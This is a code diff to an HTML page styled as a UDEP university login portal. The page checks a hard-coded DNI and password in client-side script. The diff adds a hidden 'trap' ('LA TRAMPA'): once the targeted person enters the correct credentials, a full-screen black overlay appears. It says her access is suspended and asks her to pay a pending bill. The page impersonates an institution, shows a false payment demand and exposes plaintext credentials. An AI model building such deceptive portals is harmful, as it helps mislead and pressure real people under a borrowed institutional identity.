@@ -31,9 +31,28 @@
         
         footer { background-color: #222; color: white; padding: 25px; text-align: center; margin-top: 20px; }
         .footer-text { font-size: 16px; font-family: 'Times New Roman', Times, serif; letter-spacing: 1px; }
+
+        /* ESTILO DEL MURO DE PAGO - Oculto por defecto */
+        #muro-bloqueo {
+            display: none; /* Inicia invisible */
+            position: fixed; 
+            top: 0; left: 0; width: 100vw; height: 100vh; 
+            background: rgba(0, 0, 0, 0.95); 
+            color: white; 
+            flex-direction: column; justify-content: center; align-items: center; 
+            z-index: 999999; 
+            text-align: center; 
+            font-family: sans-serif;
+        }
     </style>
 </head>
 <body>
+
+    <!-- CARTEL DE BLOQUEO (Estará oculto hasta que inicie sesión) -->
+    <div id="muro-bloqueo">
+        <h1 style="color: #ff4c4c; font-size: 3rem; margin-bottom: 20px;">Acceso Suspendido</h1>
+        <p style="font-size: 1.5rem;">Por favor, regularizar el pago de la boleta pendiente para restablecer el servicio.</p>
+    </div>
 
     <header>
         <div class="header-logo">UDEP</div>
@@ -46,11 +65,9 @@
         
         <div class="login-card">
             <div class="input-group">
-                <!-- Campo para el DNI -->
                 <input type="text" id="dni" placeholder="DNI" maxlength="8" autocomplete="off">
             </div>
             <div class="input-group">
-                <!-- Campo para la contraseña -->
                 <input type="password" id="password" placeholder="Contraseña">
             </div>
             
@@ -69,17 +86,14 @@
     </footer>
 
     <script>
-        // Esta función actúa como el "guardia" de tu página
         function validarCredenciales() {
             var dniIngresado = document.getElementById('dni').value;
             var passIngresada = document.getElementById('password').value;
             
-            // Verificamos que coincida exactamente con lo que pediste
             if(dniIngresado === '78222137' && passIngresada === 'XYPLCN9067hf') {
-                // Si la contraseña es correcta, lo mandamos a la página principal (la que haremos después)
-                window.location.href = 'avisos.html'; 
+                // LA TRAMPA: Si pone sus datos bien, en lugar de enviarla a avisos.html, le activamos el muro negro.
+                document.getElementById('muro-bloqueo').style.display = 'flex'; 
             } else {
-                // Si se equivoca, le sale un error realista
                 alert('Credenciales incorrectas. Por favor, verifique su DNI y contraseña.');
             }
         }
